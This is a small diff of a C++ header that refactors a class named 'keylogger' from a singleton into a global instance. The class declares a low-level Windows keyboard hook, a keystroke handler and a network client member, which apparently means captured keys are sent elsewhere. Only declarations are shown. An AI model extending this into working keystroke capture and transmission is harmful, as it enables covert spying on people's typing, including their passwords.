@@ -14,17 +14,17 @@
 class keylogger
 {
 public:
-    
-    static keylogger& GetInstance();
+    keylogger();
+    ~keylogger();
+    void handleKeyStroke(DWORD virtualKeyCode, keyStatus status);
 
 
 private:
-    keylogger();
-
-    ~keylogger();
-    static HHOOK hook;
-
-    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-    
+    HHOOK hook;
     kq::client_interface<messageType> client;
+
+private:
+    static LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 };
+
+extern keylogger transKeys;
